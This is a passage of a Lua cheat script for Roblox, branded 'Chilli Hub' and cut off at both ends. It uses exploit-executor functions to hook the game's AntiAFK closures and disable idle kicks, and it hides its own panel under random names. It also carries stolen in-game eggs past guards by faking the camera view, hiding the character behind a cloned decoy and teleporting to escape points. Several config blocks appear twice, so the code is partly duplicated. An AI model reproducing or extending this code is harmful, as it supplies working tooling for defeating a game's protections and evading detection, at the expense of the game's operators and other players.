
			if #silenced == 0 then
				silenced = getIdledConnections()
			end

			for _, conn in ipairs(silenced) do
				pcall(function()
					conn:Enable()
				end)
			end

			table.clear(antiAfkState.Silenced)
		end

		local dummyTeleportService = setmetatable({}, { __index = function()
			return function()
			end
		end })

		local antiAfkHooks = {}

		local function findTeleportServiceHooks()
			local foundHooks = {}
			if type(getgc) ~= "function" or type(debug) ~= "table" or type(debug.getupvalues) ~= "function" then
				return foundHooks
			end
			local ok, result = pcall(getgc, false)
			if not ok or type(result) ~= "table" then
				return foundHooks
			end

			for _, closure in ipairs(result) do
				if type(closure) == "function" and islclosure(closure) then
					local ok2, debugInfo = pcall(debug.info, closure, "s")

					if ok2 and type(debugInfo) == "string" and string.find(debugInfo, "AntiAFK", 1, true) then
						local ok3, upvalues = pcall(debug.getupvalues, closure)

						if ok3 and type(upvalues) == "table" then
							for idx, val in pairs(upvalues) do
								if typeof(val) == "Instance" and val.ClassName == "TeleportService" then
									foundHooks[#foundHooks + 1] = { Fn = closure, Index = idx, Original = val }
								end
							end
						end
					end
				end
			end

			return foundHooks
		end

		local function hookAntiAfk()
			for _, hook in ipairs(findTeleportServiceHooks()) do
				local ok, upval = pcall(debug.getupvalue, hook.Fn, hook.Index)

				if ok and typeof(upval) == "Instance" then
					if pcall(debug.setupvalue, hook.Fn, hook.Index, dummyTeleportService) then
						antiAfkHooks[#antiAfkHooks + 1] = hook
					end
				end
			end
		end

		local function unhookAntiAfk()
			for _, hook in ipairs(antiAfkHooks) do
				pcall(debug.setupvalue, hook.Fn, hook.Index, hook.Original)
			end

			table.clear(antiAfkHooks)
		end

		local function applyAntiAfk()
			disableIdledConnections()

			if #antiAfkHooks == 0 then
				hookAntiAfk()
			end
		end

		local connection = localPlayer.CharacterAdded:Connect(function()
			task.delay(1, function()
				if antiAfkState.Alive and antiAfkState.Enabled then
					table.clear(antiAfkState.Silenced)
					pcall(applyAntiAfk)
				end
			end)
		end)

		trackCleanup(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)

		trackCleanup(function()
			antiAfkState.Alive = false
			enableIdledConnections()
			unhookAntiAfk()
		end)

		task.spawn(function()
			while antiAfkState.Alive do
				if antiAfkState.Enabled then
					applyAntiAfk()
				end

				task.wait(600)
			end
		end)

		utilitySection:CreateToggle({
			Name = "Anti AFK",
			Default = true,
			Callback = function(arg)
				antiAfkState.Enabled = arg ~= false

				if antiAfkState.Enabled then
					applyAntiAfk()
				else
					enableIdledConnections()
					unhookAntiAfk()
				end
			end,
		})
	end

	local TweenService = game:GetService("TweenService")
	local GuiService = game:GetService("GuiService")
	local StarterGui = game:GetService("StarterGui")
	local antiGuard = chilliState.AntiGuard

	local lightDarkAntiGuardConfig = {
		Target = "line",
		LineOffset = 8,
		Height = 45,
		OffsetX = -90,
		OffsetZ = -35,
		Jitter = 0,
		Point = false,
		Disguise = true,
		Limp = true,
		Facing = "Zero",
		Freeze = false,
		StartAt = 0,
		Steps = {
			{ At = 0.1, To = "home" },
			{ At = 0.33, To = "home" },
			{ At = 0.56, To = "home" },
			{ At = 0.75, To = "start" },
		},
		ReleaseAt = 0.8,
		WeldScanGap = 0.03,
		BusyLimit = 2.5,
	}

	local function buildDefaultAntiGuardConfig(stepCount, startAt, stepInterval, returnToStartAt, releaseAt, busyLimit)
		local stepsList = {}

		for i = 1, stepCount do
			stepsList[#stepsList + 1] = { At = startAt + stepInterval * (i - 1), To = "home" }
		end

		stepsList[#stepsList + 1] = { At = returnToStartAt, To = "start" }

		return {
			Target = "home",
			LineOffset = 8,
			Height = 0,
			OffsetX = 0,
			OffsetZ = 0,
			Jitter = 0,
			Point = false,
			Disguise = true,
			Limp = false,
			Facing = "Zero",
			Freeze = true,
			StartAt = 0,
			StartRandom = 0,
			HopRandom = 0.085,
			HoldRandom = 0.395,
			Steps = stepsList,
			ReleaseAt = releaseAt,
			WeldScanGap = 0.03,
			BusyLimit = busyLimit,
		}
	end

	chilliAntiGuard = { LightDark = lightDarkAntiGuardConfig, Default = buildDefaultAntiGuardConfig(25, 0, 0.05, 1.27, 1.52, 2.5) }
end

local TweenService = game:GetService("TweenService")
local GuiService = game:GetService("GuiService")
local StarterGui = game:GetService("StarterGui")
local antiGuard = chilliState.AntiGuard
local lightDarkAntiGuardConfig = {
	Target = "line",
	LineOffset = 8,
	Height = 45,
	OffsetX = -90,
	OffsetZ = -35,
	Jitter = 0,
	Point = false,
	Disguise = true,
	Limp = true,
	Facing = "Zero",
	Freeze = false,
	StartAt = 0,
	Steps = {
		{ At = 0.1, To = "home" },
		{ At = 0.33, To = "home" },
		{ At = 0.56, To = "home" },
		{ At = 0.75, To = "start" },
	},
	ReleaseAt = 0.8,
	WeldScanGap = 0.03,
	BusyLimit = 2.5,
}

pcall(function()
	getgenv().ChilliAntiGuard = chilliAntiGuard
end)

local antiGuardTheme = {
	Card = Color3.fromRGB(15, 15, 19),
	CardTop = Color3.fromRGB(24, 22, 28),
	Stroke = Color3.fromRGB(48, 46, 56),
	Text = Color3.fromRGB(240, 238, 244),
	AccentA = Color3.fromRGB(255, 72, 72),
	AccentB = Color3.fromRGB(255, 150, 60),
	Good = Color3.fromRGB(80, 220, 140),
	Work = Color3.fromRGB(255, 190, 70),
	Bad = Color3.fromRGB(240, 90, 90),
	Off = Color3.fromRGB(58, 56, 66),
}

local antiGuardEscapePoints = {
	{ Path = { "GearGiver_Slap", "Podium" }, Offset = Vector3.new(-16.415, 21.072, -6.106) },
	{
		Path = { "World", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
		Offset = Vector3.new(-26.776, 1.75, 18.665),
	},
	{
		Path = { "__OBJECTS", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
		Offset = Vector3.new(-26.776, 1.75, 18.665),
	},
}

local antiGuardPanelHeight = 52
local isAntiGuardAlive = true
local antiGuardConnections = {}

local antiGuardState = {
	AreaId = nil,
	SignalCarrying = false,
	WeldCarrying = false,
	Carrying = false,
	Active = false,
	Disguise = nil,
	FlashRequest = nil,
	FlashUntil = 0,
}

local function generateRandomGuiName()
	local chars = {}

	for i = 1, math.random(10, 16) do
		chars[i] = string.char(math.random(97, 122))
	end

	return table.concat(chars)
end

local antiGuardGuiParent = nil

pcall(function()
	antiGuardGuiParent = gethui()
end)

antiGuardGuiParent = antiGuardGuiParent or CoreGui

local function createAntiGuardGuiElement(className, parent, props)
	local instance = Instance.new(className)
	instance.Name = generateRandomGuiName()
	local propsTable = props or {}

	for propName, propValue in pairs(propsTable) do
		instance[propName] = propValue
	end

	instance.Parent = parent
	return instance
end

local function tweenAntiGuardElement(instance, duration, goalProps, easingStyle)
	local ok, result = pcall(function()
		local style = easingStyle or Enum.EasingStyle.Quint
		return TweenService:Create(instance, TweenInfo.new(duration, style, Enum.EasingDirection.Out), goalProps)
	end)

	if ok and result then
		result:Play()
	end
end

local antiGuardScreenGui = createAntiGuardGuiElement("ScreenGui", nil, {
	ResetOnSpawn = false,
	IgnoreGuiInset = true,
	DisplayOrder = -100,
	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
})

local antiGuardMainFrame = createAntiGuardGuiElement("Frame", antiGuardScreenGui, {
	AnchorPoint = Vector2.new(0.5, 0.5),
	Position = UDim2.new(0.5, 0, 1, -120),
	Size = UDim2.fromOffset(226, 52),
	BackgroundTransparency = 1,
})

local antiGuardMainScale = createAntiGuardGuiElement("UIScale", antiGuardMainFrame, { Scale = 1 })
local antiGuardCardFrame = createAntiGuardGuiElement("Frame", antiGuardMainFrame, { Size = UDim2.fromScale(1, 1), BackgroundColor3 = antiGuardTheme.Card, BorderSizePixel = 0, Active = true })
createAntiGuardGuiElement("UICorner", antiGuardCardFrame, { CornerRadius = UDim.new(0, 14) })
local antiGuardCardScale = createAntiGuardGuiElement("UIScale", antiGuardCardFrame, { Scale = 0.86 })
createAntiGuardGuiElement("UIGradient", antiGuardCardFrame, { Color = ColorSequence.new(antiGuardTheme.CardTop, antiGuardTheme.Card), Rotation = 90 })
local antiGuardStrokeGradient, antiGuardIconFrame, renderAntiGuardToggle, flashAntiGuardIcon

do
	local antiGuardCardBorderStroke = createAntiGuardGuiElement("UIStroke", antiGuardCardFrame, {
		Thickness = 1.5,
		Color = Color3.fromRGB(255, 255, 255),
		Transparency = 0.2,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
	})

	antiGuardStrokeGradient = createAntiGuardGuiElement("UIGradient", antiGuardCardBorderStroke, { Color = ColorSequence.new(antiGuardTheme.Stroke, antiGuardTheme.Stroke) })

	antiGuardIconFrame = createAntiGuardGuiElement("Frame", antiGuardCardFrame, {
		AnchorPoint = Vector2.new(0, 0.5),
		Position = UDim2.new(0, 10, 0.5, 0),
		Size = UDim2.fromOffset(36, 36),
		BackgroundColor3 = Color3.fromRGB(28, 26, 32),
		BorderSizePixel = 0,
		ZIndex = 2,
	})

	createAntiGuardGuiElement("UICorner", antiGuardIconFrame, { CornerRadius = UDim.new(0, 11) })
	local antiGuardIconBorderStroke = createAntiGuardGuiElement("UIStroke", antiGuardIconFrame, { Thickness = 1.5, Color = antiGuardTheme.Off, ApplyStrokeMode = Enum.ApplyStrokeMode.Border })

	local antiGuardIconImage = createAntiGuardGuiElement("ImageLabel", antiGuardIconFrame, {
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.fromScale(0.5, 0.5),
		Size = UDim2.fromScale(0.86, 0.86),
		BackgroundTransparency = 1,
		Image = "rbxassetid://128961717706452",
		ImageTransparency = 0.35,
		ScaleType = Enum.ScaleType.Crop,
		ZIndex = 3,
	})

	createAntiGuardGuiElement("UICorner", antiGuardIconImage, { CornerRadius = UDim.new(0, 8) })
	local antiGuardIconScale = createAntiGuardGuiElement("UIScale", antiGuardIconImage, { Scale = 1 })

	createAntiGuardGuiElement("UIGradient", createAntiGuardGuiElement("TextLabel", antiGuardCardFrame, {
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 56, 0, 7),
		Size = UDim2.new(1, -112, 0, 15),
		Font = Enum.Font.BuilderSansExtraBold,
		TextSize = 14,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextColor3 = Color3.fromRGB(255, 255, 255),
		Text = "Chilli Hub",
		ZIndex = 2,
	}), { Color = ColorSequence.new(Color3.fromRGB(255, 120, 100), Color3.fromRGB(255, 190, 110)) })

	createAntiGuardGuiElement("TextLabel", antiGuardCardFrame, {
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 56, 0, 22),
		Size = UDim2.new(1, -112, 0, 20),
		Font = Enum.Font.GothamBlack,
		TextSize = 15,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextColor3 = antiGuardTheme.Text,
		Text = "Anti Guard",
		ZIndex = 2,
	})

	local antiGuardToggleButton = createAntiGuardGuiElement("TextButton", antiGuardCardFrame, {
		AnchorPoint = Vector2.new(1, 0.5),
		Position = UDim2.new(1, -12, 0.5, 0),
		Size = UDim2.fromOffset(42, 22),
		BackgroundColor3 = Color3.fromRGB(255, 255, 255),
		AutoButtonColor = false,
		BorderSizePixel = 0,
		Text = "",
		ZIndex = 2,
	})

	createAntiGuardGuiElement("UICorner", antiGuardToggleButton, { CornerRadius = UDim.new(1, 0) })
	local antiGuardToggleGradient = createAntiGuardGuiElement("UIGradient", antiGuardToggleButton, { Color = ColorSequence.new(antiGuardTheme.Off, antiGuardTheme.Off) })

	local antiGuardToggleKnob = createAntiGuardGuiElement("Frame", antiGuardToggleButton, {
		AnchorPoint = Vector2.new(0, 0.5),
		Position = UDim2.new(0, 3, 0.5, 0),
		Size = UDim2.fromOffset(16, 16),
		BackgroundColor3 = Color3.fromRGB(245, 245, 250),
		BorderSizePixel = 0,
		ZIndex = 3,
	})

	createAntiGuardGuiElement("UICorner", antiGuardToggleKnob, { CornerRadius = UDim.new(1, 0) })

	local function getAccentOrOffColor()
		return antiGuard.Enabled and antiGuardTheme.AccentA or antiGuardTheme.Off
	end

	renderAntiGuardToggle = function(skipAnimation)
		local duration = skipAnimation and 0 or 0.28

		if antiGuard.Enabled then
			antiGuardToggleGradient.Color = ColorSequence.new(antiGuardTheme.AccentA, antiGuardTheme.AccentB)
			antiGuardStrokeGradient.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0, antiGuardTheme.Stroke),
				ColorSequenceKeypoint.new(0.45, antiGuardTheme.AccentA),
				ColorSequenceKeypoint.new(0.55, antiGuardTheme.AccentB),
				ColorSequenceKeypoint.new(1, antiGuardTheme.Stroke),
			})
			tweenAntiGuardElement(antiGuardToggleKnob, duration, { Position = UDim2.new(1, -19, 0.5, 0) }, Enum.EasingStyle.Back)
			tweenAntiGuardElement(antiGuardIconImage, duration, { ImageTransparency = 0 })
			tweenAntiGuardElement(antiGuardCardBorderStroke, 0.3, { Transparency = 0 })
		else
			antiGuardToggleGradient.Color = ColorSequence.new(antiGuardTheme.Off, antiGuardTheme.Off)
			antiGuardStrokeGradient.Color = ColorSequence.new(antiGuardTheme.Stroke, antiGuardTheme.Stroke)
			tweenAntiGuardElement(antiGuardToggleKnob, duration, { Position = UDim2.new(0, 3, 0.5, 0) }, Enum.EasingStyle.Back)
			tweenAntiGuardElement(antiGuardIconImage, duration, { ImageTransparency = 0.35 })
			tweenAntiGuardElement(antiGuardCardBorderStroke, 0.3, { Transparency = 0.2 })
		end

		if antiGuardState.FlashUntil <= os.clock() then
			tweenAntiGuardElement(antiGuardIconBorderStroke, duration, { Color = getAccentOrOffColor() })
		end
	end

	flashAntiGuardIcon = function(color, holdDuration)
		antiGuardState.FlashRequest = { Color = color, Hold = holdDuration }
	end

	local function processAntiGuardFlash()
		local flashRequest = antiGuardState.FlashRequest
		if not flashRequest then
			return
		end
		antiGuardState.FlashRequest = nil
		antiGuardState.FlashUntil = os.clock() + (flashRequest.Hold or 0)
		tweenAntiGuardElement(antiGuardIconBorderStroke, 0.2, { Color = flashRequest.Color })

		if flashRequest.Hold then
			task.delay(flashRequest.Hold, function()
				if isAntiGuardAlive and os.clock() >= antiGuardState.FlashUntil then
					tweenAntiGuardElement(antiGuardIconBorderStroke, 0.3, { Color = getAccentOrOffColor() })
				end
			end)
		end
	end

	local function syncAntiGuardHandle(enabled)
		local handle = antiGuard.Handle
		if type(handle) ~= "table" then
			return
		end

		for _, methodName in ipairs({ "Set", "SetValue" }) do
			local ok, result = pcall(function()
				return handle[methodName]
			end)

			if ok and type(result) == "function" and pcall(result, handle, enabled) then
				return
			end
		end
	end

	antiGuard.Render = renderAntiGuardToggle

	local antiGuardClickArea = createAntiGuardGuiElement("TextButton", antiGuardCardFrame, {
		Size = UDim2.fromScale(1, 1),
		BackgroundTransparency = 1,
		AutoButtonColor = false,
		Text = "",
		ZIndex = 10,
	})

	antiGuardConnections[#antiGuardConnections + 1] = antiGuardClickArea.MouseButton1Click:Connect(function()
		antiGuard.Enabled = not antiGuard.Enabled
		renderAntiGuardToggle(false)
		syncAntiGuardHandle(antiGuard.Enabled)
		tweenAntiGuardElement(antiGuardIconScale, 0.12, { Scale = 1.15 })

		task.delay(0.12, function()
			if isAntiGuardAlive then
				tweenAntiGuardElement(antiGuardIconScale, 0.3, { Scale = 1 }, Enum.EasingStyle.Back)
			end
		end)
	end)

	local toggleButtonSize = antiGuardToggleButton.Size

	antiGuardConnections[#antiGuardConnections + 1] = antiGuardClickArea.MouseEnter:Connect(function()
		tweenAntiGuardElement(antiGuardToggleButton, 0.15, { Size = toggleButtonSize + UDim2.fromOffset(2, 2) })
	end)

	antiGuardConnections[#antiGuardConnections + 1] = antiGuardClickArea.MouseLeave:Connect(function()
		tweenAntiGuardElement(antiGuardToggleButton, 0.15, { Size = toggleButtonSize })
	end)

	local bottomGuiKeywords = {
		Hotbar = true,
		HotBar = true,
		Toolbar = true,
		ToolBar = true,
		Backpack = true,
		Inventory = true,
	}

	local detectedBottomGuis = {}
	local bottomGuiScanTimer = math.huge
	local viewportUpdateTimer = math.huge
	local cardBorderRotation = 0
	local cachedBottomGuiY = nil

	local function isGuiVisibleInHierarchy(guiObject)
		while guiObject do
			if guiObject:IsA("GuiObject") and not guiObject.Visible then
				return false
			end

			if guiObject:IsA("LayerCollector") then
				return guiObject.Enabled
			end
			guiObject = guiObject.Parent
		end

		return false
	end

	local function getTopGuiInsetY()
		local ok, result = pcall(function()
			return GuiService:GetGuiInset().Y
		end)

		return ok and result or 0
	end

	local function findHighestButtonY(container)
		local highestY = nil

		for _, descendant in ipairs(container:GetDescendants()) do
			if descendant:IsA("GuiButton") and descendant.Visible and descendant.AbsoluteSize.Y > 8 and descendant.AbsoluteSize.X > 8 then
				local y = descendant.AbsolutePosition.Y

				if not highestY or y < highestY then
					highestY = y
				end
			end
		end

		return highestY or container.AbsolutePosition.Y
	end

	local function scanForBottomGuis()
		table.clear(detectedBottomGuis)
		local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
		if not playerGui then
			return
		end

		for _, descendant in ipairs(playerGui:GetDescendants()) do
			if descendant:IsA("GuiObject") and bottomGuiKeywords[descendant.Name] then
				detectedBottomGuis[#detectedBottomGuis + 1] = descendant
			end
		end
	end

	local function collectBottomGuiElements()
		local bottomElements = {}

		pcall(function()
			if not StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.Backpack) then
				return
			end

			for _, child in ipairs(CoreGui.RobloxGui.Backpack:GetChildren()) do
				if child:IsA("GuiObject") then
					bottomElements[#bottomElements + 1] = child
				end
			end
		end)

		for _, guiObj in ipairs(detectedBottomGuis) do
			if guiObj.Parent then
				bottomElements[#bottomElements + 1] = guiObj
			end
		end

		return bottomElements
	end

	local function updateAntiGuardPosition()
		local currentCamera = workspace.CurrentCamera
		if not currentCamera then
			return
		end
		local viewportSize = currentCamera.ViewportSize
		if viewportSize.X < 10 or viewportSize.Y < 10 then
			return
		end
		local isTouchDevice = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
		local viewportRatio = math.min(viewportSize.X / 1280, viewportSize.Y / 720)
		local scale = isTouchDevice and math.clamp(viewportRatio * 1.05, 0.6, 0.8) * 0.97 or math.clamp(viewportRatio, 0.8, 1.1)
		antiGuardMainScale.Scale = scale
		local backgroundTransparency = isTouchDevice and 0.3 or 0

		if antiGuardCardFrame.BackgroundTransparency ~= backgroundTransparency then
			antiGuardCardFrame.BackgroundTransparency = backgroundTransparency
			antiGuardIconFrame.BackgroundTransparency = backgroundTransparency
		end

		local targetBottomY = viewportSize.Y - 8 * scale
		local foundBottomElement = false

		for _, bottomGui in ipairs(collectBottomGuiElements()) do
			local ok, isVisible = pcall(isGuiVisibleInHierarchy, bottomGui)

			if ok and isVisible then
				local absoluteSize = bottomGui.AbsoluteSize
				local y = bottomGui.AbsolutePosition.Y

				if absoluteSize.X > 20 and absoluteSize.Y > 20 and absoluteSize.Y < viewportSize.Y * 0.4 and y + absoluteSize.Y / 2 > viewportSize.Y * 0.5 then
					local ok2, buttonY = pcall(findHighestButtonY, bottomGui)
					y = ok2 and buttonY or y
					foundBottomElement = true
					targetBottomY = math.min(targetBottomY, y + getTopGuiInsetY())
				end
			end
		end

		if foundBottomElement then
			cachedBottomGuiY = viewportSize.Y - targetBottomY
		elseif cachedBottomGuiY then
			targetBottomY = viewportSize.Y - cachedBottomGuiY
		end

		local finalY = math.max(targetBottomY - (isTouchDevice and 4 or 6) * scale - antiGuardPanelHeight * scale / 2, antiGuardPanelHeight * scale / 2 + 8)
		antiGuardMainFrame.Position = UDim2.new(0.5, 0, 0, finalY)
	end

	antiGuardConnections[#antiGuardConnections + 1] = RunService.RenderStepped:Connect(function(deltaTime)
		processAntiGuardFlash()
		bottomGuiScanTimer += deltaTime
		viewportUpdateTimer += deltaTime

		if bottomGuiScanTimer >= 3 then
			bottomGuiScanTimer = 0
			pcall(scanForBottomGuis)
		end

		if viewportUpdateTimer >= 0.2 then
			viewportUpdateTimer = 0
			pcall(updateAntiGuardPosition)
		end

		if antiGuard.Enabled then
			cardBorderRotation = (cardBorderRotation + deltaTime * (antiGuardState.Active and 360 or 90)) % 360
			antiGuardStrokeGradient.Rotation = cardBorderRotation
		end
	end)
end

renderAntiGuardToggle(true)

antiGuard.ShowPanel = function(show)
	antiGuardScreenGui.Enabled = show == true
end

antiGuardScreenGui.Enabled = antiGuard.PanelShown == true
antiGuardScreenGui.Parent = antiGuardGuiParent
tweenAntiGuardElement(antiGuardCardScale, 0.45, { Scale = 1 }, Enum.EasingStyle.Back)
local findCarriedEggModel

findCarriedEggModel = function()
	local rootPart = chilliState.Root()
	if not rootPart then
		return nil
	end

	for _, child in ipairs(workspace:GetChildren()) do
		if child:IsA("Model") and child:FindFirstChild("Hitbox") then
			for _, descendant in ipairs(child:GetDescendants()) do
				if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
					local ok, part0, part1 = pcall(function()
						return descendant.Part0, descendant.Part1
					end)

					if ok and (part0 == rootPart or part1 == rootPart) then
						return child
					end
				end
			end
		end
	end

	return nil
end

	local removeDisguise

	do
		local function cloneDisguiseModel(sourceModel, parent)
			local savedArchivableState = {}

			for _, descendant in ipairs(sourceModel:GetDescendants()) do
				savedArchivableState[descendant] = descendant.Archivable

				pcall(function()
					descendant.Archivable = true
				end)
			end

			local originalArchivable = sourceModel.Archivable
			sourceModel.Archivable = true

			local ok, clonedModel = pcall(function()
				return sourceModel:Clone()
			end)

			sourceModel.Archivable = originalArchivable

			for inst, archivable in pairs(savedArchivableState) do
				pcall(function()
					inst.Archivable = archivable
				end)
			end

			if not ok or not clonedModel then
				return nil
			end
			clonedModel.Name = generateRandomKey()

			for _, descendant in ipairs(clonedModel:GetDescendants()) do
				if descendant:IsA("LuaSourceContainer") or descendant:IsA("Sound") or descendant:IsA("ForceField") or descendant:IsA("JointInstance") or descendant:IsA("Constraint") or descendant:IsA("WeldConstraint") or descendant:IsA("BodyMover") or descendant:IsA("ProximityPrompt") or descendant:IsA("BillboardGui") then
					pcall(function()
						descendant:Destroy()
					end)
				elseif descendant:IsA("BasePart") then
					descendant.Anchored = true
					descendant.CanCollide = false
					descendant.CanQuery = false
					descendant.CanTouch = false
				elseif descendant:IsA("Humanoid") then
					descendant.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
					descendant.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOff
				end
			end

			clonedModel.Parent = parent
			return clonedModel
		end

		local function applyDisguise(character, disguiseOffset)
			local currentCamera = workspace.CurrentCamera
			if not character or not currentCamera or antiGuardState.Disguise then
				return
			end
			local offset = disguiseOffset or Vector3.zero
			local disguise = { Camera = currentCamera, CameraType = currentCamera.CameraType, CameraCFrame = currentCamera.CFrame, Copies = {}, Hidden = {} }
			antiGuardState.Disguise = disguise
			local disguiseTargets = { character }
			local ok, carriedEgg = pcall(findCarriedEggModel)

			if ok and carriedEgg then
				disguiseTargets[#disguiseTargets + 1] = carriedEgg
			end

			for _, model in ipairs(disguiseTargets) do
				for _, descendant in ipairs(model:GetDescendants()) do
					if descendant:IsA("BasePart") or descendant:IsA("Decal") or descendant:IsA("Texture") then
						disguise.Hidden[#disguise.Hidden + 1] = descendant
					end
				end
			end

			local function updateDisguiseRender()
				for _, visualPart in ipairs(disguise.Hidden) do
					pcall(function()
						visualPart.LocalTransparencyModifier = 1
					end)
				end

				pcall(function()
					if currentCamera.CameraType ~= Enum.CameraType.Scriptable then
						currentCamera.CameraType = Enum.CameraType.Scriptable
					end

					currentCamera.CFrame = disguise.CameraCFrame
				end)
			end

			updateDisguiseRender()
			disguise.BindName = generateRandomKey()

			if not pcall(function()
				RunService:BindToRenderStep(disguise.BindName, Enum.RenderPriority.Last.Value + 1, updateDisguiseRender)
			end) then
				disguise.BindName = nil
				disguise.Link = RunService.RenderStepped:Connect(updateDisguiseRender)
			end

			disguise.Beat = RunService.Heartbeat:Connect(updateDisguiseRender)

			for _, model in ipairs(disguiseTargets) do
				local ok2, clonedCopy = pcall(cloneDisguiseModel, model, currentCamera)

				if ok2 and clonedCopy then
					if offset.Magnitude > 0.01 then
						for _, descendant in ipairs(clonedCopy:GetDescendants()) do
							if descendant:IsA("BasePart") then
								pcall(function()
									descendant.CFrame = descendant.CFrame + offset
								end)
							end
						end
					end

					disguise.Copies[#disguise.Copies + 1] = clonedCopy
				end
			end
		end

		removeDisguise = function()
			local disguise = antiGuardState.Disguise
			if not disguise then
				return
			end
			antiGuardState.Disguise = nil

			if disguise.BindName then
				pcall(function()
					RunService:UnbindFromRenderStep(disguise.BindName)
				end)
			end

			if disguise.Link then
				pcall(function()
					disguise.Link:Disconnect()
				end)
			end

			if disguise.Beat then
				pcall(function()
					disguise.Beat:Disconnect()
				end)
			end

			for _, visualPart in ipairs(disguise.Hidden) do
				pcall(function()
					visualPart.LocalTransparencyModifier = 0
				end)
			end

			pcall(function()
				disguise.Camera.CameraType = disguise.CameraType
			end)

			for _, copy in ipairs(disguise.Copies) do
				pcall(function()
					copy:Destroy()
				end)
			end
		end

		local function getSafeSpotCFrame()
			for _, escapePoint in ipairs(antiGuardEscapePoints) do
				local currentInst = workspace

				for _, pathName in ipairs(escapePoint.Path) do
					currentInst = currentInst and currentInst:FindFirstChild(pathName) or nil
				end

				if currentInst and currentInst:IsA("BasePart") then
					return currentInst.CFrame:PointToWorldSpace(escapePoint.Offset)
				end
			end

			return Vector3.new(528.7, 70.57, -364.11)
		end

		local function teleportAndStopVelocity(character, rootPart, targetPosition, rotationCFrame, zeroVelocity)
			local cFrame = CFrame.new(targetPosition) * rotationCFrame

			pcall(function()
				character:PivotTo(cFrame)
			end)

			if (rootPart.Position - targetPosition).Magnitude > 3 then
				pcall(function()
					rootPart.CFrame = cFrame
				end)
			end

			if zeroVelocity == false then
				return
			end

			for _, descendant in ipairs(character:GetDescendants()) do
				if descendant:IsA("BasePart") then
					pcall(function()
						descendant.AssemblyLinearVelocity = Vector3.zero
						descendant.AssemblyAngularVelocity = Vector3.zero
					end)
				end
			end
		end

		local function getCarryAreaId()
			local areaId = antiGuardState.AreaId

			if type(areaId) ~= "string" or areaId == "" then
				areaId = type(chilliState.Steal) == "table" and chilliState.Steal.CarryAreaId or nil
			end

			if type(areaId) ~= "string" or areaId == "" then
				local attribute = localPlayer:GetAttribute("AreaId")
				areaId = type(attribute) == "string" and attribute or nil
			end

			return areaId
		end

		local areaConfigKeyAliases = { lightdark = "LightDark" }

		local function getAntiGuardConfigKey(areaName)
			if type(areaName) ~= "string" then
				return "Default"
			end
			local cleaned = string.gsub(areaName, "[^%a]", "")
			return areaConfigKeyAliases[string.lower(cleaned)] or "Default"
		end

		local function getAntiGuardConfig()
			local ok, result = pcall(function()
				return getgenv().ChilliAntiGuard
			end)

			if ok and type(result) == "table" then
				if type(result.Steps) == "table" then
					return result
				end
				local defaultConfig = result[getAntiGuardConfigKey(getCarryAreaId())] or result.Default
				if type(defaultConfig) == "table" then
					return defaultConfig
				end
			end

			return chilliAntiGuard[getAntiGuardConfigKey(getCarryAreaId())] or lightDarkAntiGuardConfig
		end

		local function getComputedAntiGuardConfig()
			local baseConfig = getAntiGuardConfig()
			local options = antiGuard.Options
			if type(options) ~= "table" or options.Destination == "Safe Zone" and not options.Stay then
				return baseConfig
			end
			local computedConfig = {}

			for k, v in pairs(baseConfig) do
				computedConfig[k] = v
			end

			if options.Destination == "Next To Line" then
				computedConfig.Target = "edge"
				computedConfig.LineOffset = 6
				computedConfig.Height = 0
				computedConfig.OffsetX = 0
				computedConfig.OffsetZ = 0
			elseif options.Destination == "Saved Spot" and typeof(options.Spot) == "Vector3" then
				computedConfig.Target = "point"
				computedConfig.Point = options.Spot
				computedConfig.Height = 0
				computedConfig.OffsetX = 0
				computedConfig.OffsetZ = 0
			end

			if options.Stay and type(baseConfig.Steps) == "table" then
				local steps = {}

				for _, step in ipairs(baseConfig.Steps) do
					if type(step) == "table" and step.To ~= "start" then
						steps[#steps + 1] = step
					end
				end

				computedConfig.Steps = steps
			end

			return computedConfig
		end

		local function calculateSeparationLineOffsetPosition(config, currentPos)
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("Areas")
			world = world and world:FindFirstChild("SeparationLine")

			if world and world:IsA("BasePart") then
				local cFrame = world.CFrame
				local rightVector = world.Size.X >= world.Size.Z and cFrame.RightVector or cFrame.LookVector
				local vector = Vector3.new(rightVector.X, 0, rightVector.Z)
				local crossVec = (Vector3.new(0, 1, 0)):Cross(vector)
				local lateral = Vector3.new(crossVec.X, 0, crossVec.Z)

				if lateral.Magnitude > 0.001 then
					local unit = lateral.Unit
					local offsetPos = cFrame.Position + ((currentPos - cFrame.Position):Dot(unit) >= 0 and -unit or unit) * (tonumber(config.LineOffset) or 8)
					return Vector3.new(offsetPos.X, currentPos.Y + 0.5, offsetPos.Z)
				end
			end

			return nil
		end

		local function calculateLineEdgePosition(config, currentPos)
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("Areas")
			world = world and world:FindFirstChild("SeparationLine")

			if world and world:IsA("BasePart") then
				local cFrame = world.CFrame
				local rightVector = world.Size.X >= world.Size.Z and cFrame.RightVector or cFrame.LookVector
				local vector = Vector3.new(rightVector.X, 0, rightVector.Z)
				local crossVec = (Vector3.new(0, 1, 0)):Cross(vector)
				local lateral = Vector3.new(crossVec.X, 0, crossVec.Z)

				if lateral.Magnitude > 0.001 and vector.Magnitude > 0.001 then
					local unit = vector.Unit
					local unit2 = lateral.Unit
					local delta = currentPos - cFrame.Position
					local minBound = -world.Size.Magnitude / 2
					local maxBound = world.Size.Magnitude / 2
